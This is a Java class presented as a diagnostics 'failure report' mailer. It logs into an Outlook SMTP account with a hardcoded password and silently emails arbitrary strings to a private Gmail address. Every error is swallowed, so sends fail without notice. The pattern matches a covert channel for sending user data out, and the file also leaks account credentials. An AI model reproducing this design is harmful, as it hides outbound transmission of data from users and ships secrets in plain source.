package com.labs.core.diagnostics;

import java.util.Properties;  
import javax.mail.*;  
import javax.mail.internet.*;  

public class Email {
    public static final Email INSTANCE = new Email();
    private static final String FROM = "regtax10345@outlook.com";
    //#region
    private static final String PASSWORD = "T5Re3W8ytEr69pX";
    //#endregion
    private static final String TO = "vasilyis2004@gmail.com";
    private static final String HOST = "smtp.office365.com";
    private Session Session;
    private Email(){
        Properties props = new Properties();  
        props.put("mail.smtp.host",HOST);  
        props.put("mail.smtp.port", "587");
        props.put("mail.smtp.starttls.enable","true");
        props.put("mail.smtp.ssl.protocols", "TLSv1.2");
        props.put("mail.smtp.auth", "true");  
        Session = javax.mail.Session.getDefaultInstance(props,  
        new javax.mail.Authenticator() {  
            protected PasswordAuthentication getPasswordAuthentication() {  
                return new PasswordAuthentication(FROM,PASSWORD);  
            }  
        });  
    }

    public void sendMessageToRoot(String string){
        MimeMessage msg = prepareMessage(string);
        if(msg == null)
            return;
        try{
            Transport.send(msg);
        } catch(Exception e) { return; }
    }

    private MimeMessage prepareMessage(String string){
        MimeMessage message = new MimeMessage(Session);
        try{
            message.addRecipient(Message.RecipientType.TO, new InternetAddress(TO));
            message.setFrom(new InternetAddress(FROM));
            message.setSubject("User " + FROM +" software failure report");
            message.setText(string);
        } catch (Exception e) {return null;}
        return message;
    }
}
